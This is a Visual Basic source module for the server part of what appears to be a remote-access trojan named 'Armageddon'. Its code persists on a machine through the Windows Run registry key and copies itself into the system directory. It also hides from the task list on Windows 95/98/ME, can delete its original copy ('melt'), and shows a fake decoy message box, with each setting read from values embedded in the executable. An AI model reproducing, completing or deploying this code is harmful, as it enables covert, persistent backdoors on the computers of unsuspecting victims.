Attribute VB_Name = "modServerStartup"
'***************************************
'*    TITLE: SERVER SETUP MODULE       *
'* PROGRAMMER: BARRY FRENCH A.K.A (EC) *
'*       USE WITH: ARMAGEDDON          *
'***************************************

Option Explicit

Public Function MakeRegStart(sFileName As String, Optional sKeyName As String)
Dim lResult As Long

    RegCreateKey HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" & sKeyName, lResult
    RegSetValueEx lResult, App.EXEName, 0, REG_SZ, ByVal sFileName & ".exe", Len(sFileName & ".exe")
    RegCloseKey lResult
End Function

'Find the system directory and returns it as a string
Public Function FindSysDir() As String
Dim sDirectory As String

    sDirectory = SetBuffer(sDirectory, 255)
    GetSystemDirectory sDirectory, 255
    
    sDirectory = Left(sDirectory, InStr(1, sDirectory, Chr(0)) - 1)
    
    FindSysDir = sDirectory
End Function

'Hides the server from the task list 95/98/ME only
'Returns a Boolean value of success or faliure / true or false
'lFlags represents hiding it or not, 1 to hide 0 to unhide 0
Public Function MakeMeService(lFlags As Long) As Boolean
Dim cProcess As Long
Dim RetVal As Long

    cProcess = GetCurrentProcessId
    
    If lFlags = 0 Then
        RetVal = RegisterServiceProcess(cProcess, RSP_UNREGISTER_SERVICE)
    Else
        RetVal = RegisterServiceProcess(cProcess, RSP_SIMPLE_SERVICE)
    End If
    
    If RetVal = 0 Then
        MakeMeService = False
    Else
        MakeMeService = True
    End If
End Function

'Copies the server to the windows system directory
'Checks server is not in system dir first otherwise pointless copy
Public Sub CopyMe()
Dim sFileCont As String

    OpenMe
        
    sFileCont = SetBuffer(sFileCont, LOF(1))
    Get #1, , sFileCont
        
    CloseMe
        
    Open FindSysDir & "\" & App.EXEName & ".exe" For Binary Access Write As #2
        
    Put #2, , sFileCont
        
    Close #2
End Sub

'Opens the server to read in binary access, no return values
Public Sub OpenMe()
    Open App.Path & "\" & App.EXEName & ".exe" For Binary Access Read As #1
End Sub

'Closes the server only after being opened, no return values
Public Sub CloseMe()
    Close #1
End Sub

'Fills a string with spaces, useful for string replacing
Public Function SetBuffer(sBuffer As String, lSize As Long) As String
    SetBuffer = Space(lSize)
End Function

'FIND FUNCTIONS USED TO FIND THE SERVER PARAMETERS!

'Find the servers port to run on, returns a long representing the port
Public Function FindPort() As Long
Dim sFileCont As String

Dim lPort As Long
Dim lPercent As Long
        
        OpenMe
        
        sFileCont = SetBuffer(sFileCont, LOF(1))
        Get #1, , sFileCont
        
        CloseMe
        
        lPort = InStr(1, sFileCont, "*PORT*")
        
        If lPort = 0 Then
            FindPort = 5583
            Exit Function
        End If
        
        lPort = InStr(lPort, sFileCont, "%")
        lPercent = InStr(lPort + 1, sFileCont, "%")
        
        FindPort = Mid(sFileCont, lPort + 1, (lPercent - lPort) - 1)
End Function

'Find the servers password, if none then no password is needed
'Returns a string representing the password
Public Function FindPassword() As String
Dim sFileCont As String

Dim lPass As Long
Dim lPercent As Long
    
    OpenMe
    
    sFileCont = SetBuffer(sFileCont, LOF(1))
    Get #1, , sFileCont
    
    CloseMe
    
    lPass = InStr(1, sFileCont, "*PASSWORD*")
    
    If lPass = 0 Then
        FindPassword = ""
        Exit Function
    End If
    
    lPass = InStr(lPass, sFileCont, "%")
    lPercent = InStr(lPass + 1, sFileCont, "%")
    
    FindPassword = Mid(sFileCont, lPass + 1, (lPercent - lPass) - 1)
End Function

'Find the start method, returns a long representing the start method
'1 = Registry
'2 = Start Menu
'3 = Both
Public Function FindStartMethod() As Long
Dim sFileCont As String

Dim lStart As Long
Dim lPercent As Long

    OpenMe
    
    sFileCont = SetBuffer(sFileCont, LOF(1))
    Get #1, , sFileCont
    
    CloseMe
    
    lStart = InStr(1, sFileCont, "*START_METHOD*")
    
    If lStart = 0 Then
        FindStartMethod = 1
        Exit Function
    End If
    
    lStart = InStr(lStart, sFileCont, "%")
    lPercent = InStr(lStart + 1, sFileCont, "%")
    
    FindStartMethod = Mid(sFileCont, lStart + 1, (lPercent - lStart) - 1)
End Function

'If registry startup is used then this is the Key value used in
'the registry. Returns a string representing the keyname
Public Function FindKeyName() As String
Dim sFileCont As String

Dim lKey As Long
Dim lPercent As Long

    OpenMe
    
    sFileCont = SetBuffer(sFileCont, LOF(1))
    Get #1, , sFileCont
    
    CloseMe
    
    lKey = InStr(1, sFileCont, "*KEY_NAME*")
    
    If lKey = 0 Then
        FindKeyName = "Windows"
        Exit Function
    End If
    
    lKey = InStr(lKey, sFileCont, "%")
    lPercent = InStr(lKey + 1, sFileCont, "%")
    
    FindKeyName = Mid(sFileCont, lKey + 1, (lPercent - lKey) - 1)
    
    If FindKeyName = "" Then FindKeyName = "Windows"
End Function

'Returns a boolean stating wheather or not the server should delete
'itself after being copied
Public Function FindMelt() As Boolean
Dim sFileCont As String
Dim sCheck As String

Dim lMelt As Long
Dim lPercent As Long

    OpenMe
    
    sFileCont = SetBuffer(sFileCont, LOF(1))
    Get #1, , sFileCont
    
    CloseMe
    
    lMelt = InStr(1, sFileCont, "*MELT_VALUE*")
    
    If lMelt = 0 Then
        FindMelt = False
        Exit Function
    End If
    
    lMelt = InStr(lMelt, sFileCont, "%")
    lPercent = InStr(lMelt + 1, sFileCont, "%")
    
    sCheck = Mid(sFileCont, lMelt + 1, (lPercent - lMelt) - 1)
    
    If sCheck = "False" Then
        FindMelt = False
    Else
        FindMelt = True
    End If
End Function

'Returns a boolean stating wheather or not to hide the server from
'the task list 95/98/ME only
Public Function FindTask() As Boolean
Dim sFileCont As String
Dim sCheck As String

Dim lTask As Long
Dim lPercent As Long

    OpenMe
    
    sFileCont = SetBuffer(sFileCont, LOF(1))
    Get #1, , sFileCont
    
    CloseMe
    
    lTask = InStr(1, sFileCont, "*HIDE_TASK*")
    
    If lTask = 0 Then
        FindTask = False
        Exit Function
    End If
    
    lTask = InStr(lTask, sFileCont, "%")
    lPercent = InStr(lTask + 1, sFileCont, "%")
    
    sCheck = Mid(sFileCont, lTask + 1, (lPercent - lTask) - 1)
    
    If sCheck = "False" Then
        FindTask = False
    Else
        FindTask = True
    End If
End Function

'Find the fake message and alters the argument variables to represent
'number for the icons and buttons, and strings for the title and message
Public Function FindMessage(ByRef lIcon As Long, ByRef lButtons As Long, ByRef sTitle As String, ByRef sMessage As String) As Boolean
Dim sFileCont As String

Dim lMessage As Long
Dim lPercent As Long

    OpenMe
    
    sFileCont = SetBuffer(sFileCont, LOF(1))
    Get #1, , sFileCont
    
    CloseMe
    
    lMessage = InStr(1, sFileCont, "*MESSAGE_BOX*")
    
    If lMessage = 0 Then
        FindMessage = False
        Exit Function
    End If
    
    lMessage = InStr(lMessage, sFileCont, "%")
    lPercent = InStr(lMessage + 1, sFileCont, "%")
    
    lIcon = Mid(sFileCont, lMessage + 1, (lPercent - lMessage) - 1)
    
    lMessage = InStr(lPercent + 1, sFileCont, "%")
    
    lButtons = Mid(sFileCont, lPercent + 1, (lMessage - lPercent) - 1)
    
    lPercent = InStr(lMessage + 1, sFileCont, "%")
    
    sTitle = Mid(sFileCont, lMessage + 1, (lPercent - lMessage) - 1)
    
    lMessage = InStr(lPercent + 1, sFileCont, "%")
    
    sMessage = Mid(sFileCont, lPercent + 1, (lMessage - lPercent) - 1)
    
    FindMessage = True
End Function
